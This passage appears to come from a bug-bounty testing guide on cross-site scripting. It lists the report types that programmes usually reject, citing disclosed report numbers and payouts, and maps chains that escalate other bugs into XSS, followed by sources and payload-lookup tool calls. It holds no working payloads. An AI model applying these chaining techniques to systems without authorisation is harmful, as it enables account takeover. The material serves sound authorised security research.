- **Self-XSS** (`self-xss`). A payload that runs only in the account that typed it: a POST reflection that needs
  the victim's CSRF token, a field visible only on your own settings page, your own "active sessions" list,
  anything pasted into the console. Paid exceptions exist (#982510, $500; #957229, $100) and are not a reason to
  file one. It becomes a finding when a CSRF on the storing request, a login CSRF or a cache makes it fire for
  someone else (#632017, $300, is titled as a login/logout CSRF chain).
- **HTML injection without script** (`content-spoofing`). `<b>`, `<a>` and `<img>` survive, handlers do not.
  Informative on most programmes; low when it lands in e-mails the company sends to other people (#1581499,
  $500; #1022655, $79).
- **XSS blocked by the policy, no bypass.** Outcomes differ by programme: #1804177 and #1823216 are titled as
  having no policy bypass and were paid $2,000 each, while many programmes close the same thing as informative.
  File it only with the block stated plainly.
- **Missing or weak Content-Security-Policy, missing `X-XSS-Protection`, cookies without `HttpOnly`**
  (`missing-headers`). #94909, #352734 and #162336 are titled as missing `X-XSS-Protection` and carry no bounty.
- **XSS on a host that holds nothing.** A user-content or sandbox domain, a storage provider's host, a
  third-party helpdesk, status page or documentation site (`third-party`). The dialog shows a domain that is
  not the application's.
- **Works only in Internet Explorer or legacy Edge.** Content sniffing, unencoded `location.search`,
  `expression()` in CSS. These were paid years ago (#449351, #469841) and are closed now.
- **Outdated jQuery, AngularJS or Bootstrap by version number** (`known-cve`, `automated`). No reachable sink in
  this application means no finding.
- **`javascript:` in a `Location` header, `data:` URL navigations, open redirects** (`open-redirect`). No script
  runs in the target origin.
- **JavaScript inside an uploaded PDF.** It runs in the viewer's sandbox, not in the origin.
- **A reflected marker reported from scanner output** (`automated`). A reflected string is not script execution;
  the browser run is the test.
- **Blind XSS "callbacks" without `document.domain`.** A link scanner or mail gateway fetched the URL.
- **One root cause reported once per parameter or per page.** Triage merges them and closes the rest as
  duplicates. The reflected XSS on the main search box of a long-running public programme is usually a
  duplicate before you find it.
- **Administrator-to-user XSS where the administrator may add HTML by design** (page builders, theme editors,
  CMS roles with unfiltered HTML). Works as designed.

## Chains

- Every executing item (XSS-001 to XSS-014, XSS-016) → XSS-018: the step that is paid.
- XSS-017 and XSS-015 → the item whose payload was blocked: they restore a finding and are never reported alone.
- CCH and SMG items → XSS-001, XSS-005, XSS-012: a reflection in a cached or desynchronised response is stored
  XSS for every visitor (#977851, $1,000; #488147 and #510152 are the smuggling form on a sign-in page).
- CSR items → XSS-006: a forgeable save request turns a self-only field into stored XSS in the victim's account
  (#323005 is titled as exactly that).
- RDR and OAU items → XSS-004: a redirect or `redirect_uri` parameter that accepts a script scheme (#392106,
  #397497).
- CRL items → XSS-001 and XSS-016: a CRLF in a header splits the response or sets the cookie that carries the
  payload (#191380).
- STO items → XSS-016 and XSS-018: script on a taken-over sibling sets parent-domain cookies and sends
  same-site requests.
- UPL items → XSS-009, XSS-010, XSS-015: an upload that lands on the application origin is a document or a
  script source.
- PPL items → XSS-013: a polluted property becomes the value a DOM sink reads (#1106238, $3,000).
- COR items: an XSS on a subdomain that the main API's CORS policy trusts reads that API with the victim's
  cookies.
- XSS-007 markup rendered by a server-side PDF or screenshot engine is not XSS but SSR-007.
- TPL items: `{{7*7}}` that the server evaluates is template injection; the same string evaluated by AngularJS
  in the browser is XSS-001.

## Sources

- `kb/reports/xss.md` and `kb/reports/all/xss.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"XSS"}`, `find_bypasses {"protection":"xss waf"}`, `find_payloads {"topic":"XSS Injection"}`.
- PortSwigger Web Security Academy, Cross-site scripting and DOM-based vulnerabilities; PortSwigger XSS cheat
  sheet (events and tags by browser); OWASP WSTG-INPV-01, WSTG-INPV-02 and WSTG-CLNT-01; PayloadsAllTheThings,
  XSS Injection.
- Heiderich et al., "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations" (2013);
  Michał Bentkowski's and Gareth Heyes's DOMPurify bypass write-ups (2019 to 2020).
- Weichselbaum et al., "CSP Is Dead, Long Live CSP!" (2016); Lekies et al., "Code-Reuse Attacks for the Web:
  Breaking Cross-Site Scripting Mitigations via Script Gadgets" (2017); Google CSP Evaluator; JSONBee (JSONP
  endpoints on commonly allow-listed hosts).
- `docs/04-evidence-standard.md` (proof for XSS) and `docs/06-severity.md` (reference vectors).
